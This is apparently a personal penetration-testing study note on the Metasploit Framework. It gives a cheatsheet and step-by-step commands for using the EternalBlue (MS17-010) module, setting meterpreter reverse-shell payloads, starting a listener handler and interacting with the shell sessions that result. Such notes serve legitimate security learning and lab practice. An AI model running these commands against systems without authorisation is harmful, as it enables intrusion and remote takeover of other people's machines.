# 💢 metasploit framework
Tags: #💢
Related to: 
See also: 
Previous: [[Exploitation Tools]], [[Using the Metasploit-Framework]], [[Hacking Wordpress]], [[Getting Started]], [[Footprinting]]

## Description

Metasploit is a penetration testing platform that enables you to find, exploit, and validate vulnerabilities. It provides the infrastructure, content, and tools to perform penetration tests and extensive security auditing and thanks to the open source community and Rapid7’s own hard working content team, new modules are added on a regular basis, which means that the latest exploit is available to you as soon as it’s published.

## Cheatsheet

| Command | Description |
|-|-|
| Public Exploits |  |
| `searchsploit openssh 7.2` | Search for public exploits for a web application |
| `msfconsole` | MSF: Start the Metasploit Framework |
| `search exploit eternalblue` | MSF: Search for public exploits in MSF |
| `use exploit/windows/smb/ms17_010_psexec` | MSF: Start using an MSF module |
| `show options` | MSF: Show required options for an MSF module |
| `set RHOSTS 10.10.10.40` | MSF: Set a value for an MSF module option |
| `check` | MSF: Test if the target server is vulnerable |
| `exploit` | MSF: Run the exploit on the target server is vulnerable |

## Usage Examples

	msfconsole

###  Search for exploit
	search MS17-010
	search cve:2009 type:exploit

###  Use exploit
	use exploit/windows/smb/ms17_010_eternalblue

###  Show module options
	show options	// Doesn't show payloads.

###  Set payload
	set payload windows/x64/meterpreter/reverse_tcp

###  Set LHOST & RHOST
	set LHOST tun0
	set RHOST 10.129.2.85

###  Exploit vulnerability
	exploit -j		// Run in the context of a job.

###  List all active sessions
	sessions -l

###  Interact with session
	sessions -i 1

###  Get a shell.
	shell

### Back to Meterpreter
	exit

### Background session
	<Ctrl+Z>

### Set up a handler
	use exploit/multi/handler
	set payload windows/x64/meterpreter/reverse_http
	show options
	set LHOST tun0
	set LPORT 8001
	exploit -j

# References
- https://metasploit.com/
- https://community.rapid7.com/docs/DOC-1567
